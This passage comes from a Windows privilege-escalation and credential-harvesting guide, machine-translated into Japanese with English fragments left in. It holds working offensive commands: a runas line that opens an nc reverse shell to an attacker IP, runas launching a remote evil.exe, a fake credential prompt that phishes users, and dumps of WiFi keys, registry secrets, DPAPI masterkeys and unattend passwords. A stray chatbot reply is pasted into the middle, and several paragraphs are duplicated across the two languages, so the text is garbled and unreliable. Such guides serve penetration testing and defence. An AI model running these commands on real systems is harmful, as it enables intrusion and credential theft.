- IOCTLs (access masks, METHOD_*, input validation) を制限し、直接カーネル権限を付与する代わりにブローカー型のモデルを検討する。

Detection ideas for defenders
- 防御者向けの検出アイデア: 不審なデバイス名（例: \\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示唆する特定の IOCTL シーケンスを監視する。
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) を適用し、独自の allow/deny リストを維持する。


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、次を参照してください：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts fileにハードコードされた他の既知のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(ルール一覧、ルール作成、無効化など)**

さらに[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つかります

もし root user を取得したら任意のポートで待ち受けできます（最初に `nc.exe` を使ってポートで待ち受けする際、GUI により `nc` を firewall で許可するか確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
簡単に bash を root で起動するには、`--default-user root` を試してください。

フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 内の `WSL` ファイルシステムを参照できます。

## Windows 資格情報

### Winlogon 資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

出典: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The **Windows Vault** は、**Windows** がユーザーを自動的にログインさせられるサーバー、ウェブサイト、その他のプログラム向けのユーザー資格情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などの資格情報を保存してブラウザで自動ログインできるようになると考えるかもしれませんが、そういう意味だけではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせられるための資格情報を保存します。つまり、あるリソース（サーバーやウェブサイト）にアクセスするために資格情報が必要な任意の **Windows アプリケーション** が、**この Credential Manager と Windows Vault を利用して** 提供された資格情報を使うことで、ユーザーが毎回ユーザー名とパスワードを入力する代わりに自動的に認証できる、ということです。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の資格情報を利用することはできないと思われます。したがって、あなたのアプリケーションが Vault を利用したい場合は、何らかの方法でデフォルトのストレージ vault に対して**credential manager と通信し、そのリソースの資格情報を要求する**必要があります。

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `/savecred` オプションを付けて `runas` を使用できます。以下の例は SMB share を経由してリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された credential のセットを使って `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **Data Protection API (DPAPI)** は、データの対称暗号化のための手段を提供し、主に Windows オペレーティングシステム内で非対称の秘密鍵を対称的に暗号化するために使用されます。この暗号化は、ユーザーまたはシステムのシークレットを利用してエントロピーに大きく寄与します。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。システム暗号化のシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPI を用いて暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに格納されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file** は通常 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧できませんが、PowerShell では一覧表示可能である点に注意してください。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を付けて、**mimikatz module** の `dpapi::masterkey` を使用すると復号できます。

**credentials files protected by the master password** は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を指定して、**mimikatz module** `dpapi::cred` を使って復号できます。\
`sekurlsa::dpapi` module を使用すれば（root の場合）、**memory** から多くの **DPAPI** **masterkeys** を抽出できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された認証情報を便利に保存する手段として、**scripting** や自動化タスクでよく使われます。これらの認証情報は **DPAPI** で保護されており、通常は作成されたのと同じユーザーが同じコンピューター上でのみ復号できます。

ファイルに含まれる PS credentials を **decrypt** するには、次のようにします：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

次の場所で見つけることができます: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
適切な `/masterkey` を使用して **Mimikatz** の `dpapi::rdg` モジュールで **任意の .rdg ファイルを復号**できます。\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
Mimikatz `sekurlsa::dpapi` モジュールを使用してメモリから **多くの DPAPI masterkeys を抽出**できます。

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.  
Windows ワークステーションで StickyNotes アプリを使って、これがデータベースファイルであると気付かずに **パスワードを保存** したり他の情報を記録していることがよくあります。 このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調べる価値があります。

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.  
**AppCmd.exe からパスワードを回収するには、管理者権限で実行し、High Integrity レベルである必要がある点に注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、いくつかの **credentials** が設定されており、**recovered** できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):  
このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認する。\
インストーラは**run with SYSTEM privileges**で実行され、多くは**DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**に脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSHキー

SSHの秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されていることがあるため、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
もしそのパス内にエントリが見つかった場合、おそらく保存された SSH キーです。暗号化された状態で保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` サービスが実行されておらず、起動時に自動的に開始させたい場合は、次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。sshキーを作成し、`ssh-add`で追加してマシンにsshでログインしてみましたが、レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称鍵認証中に `dpapi.dll` の使用を特定しませんでした。

### 無人のファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは**metasploit**で検索することもできます: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

ファイル **SiteList.xml** を検索します

### キャッシュされた GPP パスワード

以前、Group Policy Preferences (GPP) を使って複数のマシンにカスタムのローカル管理者アカウントを展開する機能が利用可能でした。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に保存される Group Policy Objects (GPOs) は任意のドメインユーザがアクセスできました。次に、これらの GPP 内のパスワードは公開されたデフォルトキーを用いて AES256 で暗号化されており、認証済みの任意のユーザが復号できました。これにより、ユーザが権限昇格する危険がありました。

このリスクを軽減するため、空でない "cpassword" フィールドを含むローカルにキャッシュされた GPP ファイルをスキャンする関数が作成されました。該当ファイルを見つけると、その関数はパスワードを復号してカスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、脆弱性の特定と修復に役立ちます。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使用して passwords を取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web構成
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を尋ねる

もしユーザーがそれらを知っている可能性があると思う場合は、いつでも**ユーザーに自分の credentials、あるいは別のユーザーの credentials を入力するよう頼むことができます**（クライアントに直接**credentials**を**尋ねる**のは非常に**危険**であることに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials を含む可能性のあるファイル名**

以前、**passwords** を **clear-text** または **Base64** で保存していた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the list of files you want searched/translated). I will then translate the English text to Japanese, preserving all markdown/html/tags/paths exactly as requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### ごみ箱内の認証情報

ごみ箱も確認して、その中の認証情報を探してください。

複数のプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む、その他の可能性のあるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

パスワードが保存されている**Chrome or Firefox**のdbを確認してください。\
また、ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windows オペレーティングシステム内に組み込まれた技術で、異なる言語で書かれたソフトウェアコンポーネント間の**相互通信**を可能にします。各 COM コンポーネントは**class ID (CLSID)で識別され**、各コンポーネントは1つ以上のインターフェースを通じて機能を公開し、それらのインターフェースは interface IDs (IIDs) で識別されます。

COM のクラスとインターフェースは、レジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** にそれぞれ定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作られたもの（= **HKEY\CLASSES\ROOT**）です。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本的に、**実行されるDLLのいずれかを上書きできれば**、その DLL が別のユーザーによって実行される場合に **escalate privileges** できます。

攻撃者が COM Hijacking を永続化の手段としてどのように利用するかを学ぶには、次を参照してください：

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

ファイル内容を検索する
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリを検索してキー名とパスワードを探す**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf** プラグインです。私はこのプラグインを作成し、ターゲット内で **credentials を検索するすべての metasploit POST module を自動的に実行します**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからパスワードを抽出する優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、このデータをプレーンテキストで保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の **sessions**, **usernames** および **passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想像してください。**SYSTEMとして実行されているプロセスが新しいプロセスを開く（`OpenProcess()`）** ときに、そのプロセスが **フルアクセス** を持っているケースを。 同じプロセスが **低権限の新しいプロセスを作成する（`CreateProcess()`）** が、メインプロセスのすべてのオープンハンドルを継承している場合。\
その場合、もし低権限プロセスに対して **フルアクセス** を持っていれば、`OpenProcess()` で作成された特権プロセスへの **オープンハンドルを取得して** シェルコードを注入することができます。\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments、いわゆる **pipes** はプロセス間の通信とデータ転送を可能にします。

Windows は **Named Pipes** という機能を提供しており、関連のないプロセス間でも、さらには異なるネットワーク上でもデータを共有できます。これはクライアント/サーバーのアーキテクチャに似ており、**named pipe server** と **named pipe client** という役割があります。

クライアントがパイプ経由でデータを送信すると、パイプを設定した **サーバー** は、必要な **SeImpersonate** 権限を持っている場合に **クライアントのアイデンティティを引き受ける（impersonate）** ことができます。パイプ経由で通信する **特権プロセス** を特定してそれを偽装できれば、あなたが作成したパイプとやり取りした際にそのプロセスのアイデンティティを取得して **より高い権限を得る** チャンスになります。攻撃の実行手順については、こちらのガイドが参考になります: [**here**](named-pipe-client-impersonation.md) および [**here**](#from-high-integrity-to-system)。

また、次のツールは **burp のようなツールで named pipe の通信を傍受する** のに使えます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこのツールはパイプを列挙してすべてのパイプを確認し、privescs を見つけるのに役立ちます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## その他

### File Extensions that could execute stuff in Windows

ページを確認してください: **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

ユーザーとしてシェルを取得したとき、スケジュールされたタスクや他のプロセスがコマンドライン上で資格情報を渡していることがあります。以下のスクリプトはプロセスのコマンドラインを2秒ごとにキャプチャし、現在の状態を前の状態と比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

コンソールや RDP 経由でグラフィカルインターフェースにアクセスでき、かつ UAC が有効になっている場合、いくつかの Microsoft Windows のバージョンでは、低権限ユーザーから "NT\AUTHORITY SYSTEM" のような端末やその他のプロセスを実行することが可能です。

